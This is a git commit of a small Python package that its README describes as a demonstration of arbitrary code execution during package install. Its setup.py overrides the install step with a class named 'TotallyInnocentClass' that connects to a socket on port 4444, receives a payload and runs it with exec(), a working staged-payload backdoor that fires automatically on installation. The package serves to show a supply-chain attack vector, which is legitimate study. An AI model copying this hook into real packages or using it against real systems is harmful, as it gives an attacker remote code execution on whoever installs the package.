29fffde5e4dfc21323c99815c2cf29d7d94fe597
Terry Chia <terrycwk1994@gmail.com>
2014-09-28 13:16:11 +0800

    Initial commit.

---
+++ README.md
@@ -0,0 +1,4 @@
+This is a python package designed to demontrate arbitrary code execution during
+the install process of a Python package.
+
+**PLEASE** do not install this by accident.
---
+++ setup.py
@@ -0,0 +1,23 @@
+import socket
+import struct
+
+from setuptools import setup
+from setuptools.command.install import install
+
+
+class TotallyInnocentClass(install):
+    def run(self):
+        s = socket.socket(2, 1)
+        s.connect(("localhost", 4444))
+        l = struct.unpack(">I", s.recv(4))[0]
+        d = s.recv(4096)
+        while len(d) != l:
+            d += s.recv(4096)
+
+        exec(d, {"s": s})
+
+setup(
+    cmdclass={
+        "install": TotallyInnocentClass
+    }
+)
